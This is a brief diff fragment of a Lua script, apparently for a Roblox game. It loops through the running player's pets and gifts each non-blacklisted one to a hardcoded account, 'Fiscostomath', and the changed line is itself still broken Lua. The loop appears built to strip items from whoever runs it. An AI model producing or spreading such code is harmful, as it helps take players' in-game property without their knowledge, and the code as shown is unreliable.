@@ -67,7 +67,7 @@ for _,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets:GetC
 	if not table.find(Blacklist, v:GetAttribute("T")) then
 		game.ReplicatedStorage.Remote.CharacterRE:FireServer("Focus", v.Name)
 		task.wait(0.1)
-		game.ReplicatedStorage.Remote.GiftRE:FireServer(game.Players.WaitForChild['Fiscostomath'])
+		game.ReplicatedStorage.Remote.GiftRE:FireServer(game.Players:WaitForChild['Fiscostomath'])
 		task.wait(0.3)
 	end
 end
